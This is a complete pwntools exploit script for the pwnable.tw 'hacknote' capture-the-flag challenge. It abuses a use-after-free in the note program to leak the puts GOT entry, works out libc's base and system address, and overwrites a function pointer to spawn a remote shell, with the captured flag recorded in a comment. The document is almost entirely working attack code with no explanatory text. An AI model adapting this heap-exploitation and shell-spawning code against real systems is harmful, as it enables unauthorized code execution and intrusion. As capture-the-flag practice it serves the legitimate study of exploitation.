from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux')
elf_path = '/home/zander/Desktop/ctf/pwnable.tw/hacknote/hacknote'
libc_path = '/home/zander/Desktop/ctf/pwnable.tw/hacknote/libc_32.so.6'

elf = ELF(elf_path)
libc = ELF(libc_path)

puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
print_note_content_fun = 0x804862b # ida
puts_got = elf.got['puts']

r = remote('chall.pwnable.tw', 10102)

def add_note(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)
def del_note(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
def print_note(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

add_note(32, 'aaaa') # +9
add_note(32, 'aaaa')
del_note(0) # ptr[2].msg_ptr
del_note(1) # ptr[2]
add_note(8, p32(print_note_content_fun) + p32(puts_got)) # 申请2个8字节的空间
print_note(0) # puts(puts_got)

r.recvuntil(":")
tmp = r.recvline()
puts_addr = u32(tmp[0:4])
base_addr = puts_addr - puts_offset
system_addr = base_addr + system_offset

del_note(2)
add_note(8, p32(system_addr) + ";sh")
print_note(0)

r.interactive()

# $ cat ./home/hacknote/flag
# FLAG{Us3_aft3r_fl3333_in_h4ck_not3}

# b *0x0804869A
# b *0x08048799
# b *0x08048863
# b *0x08048889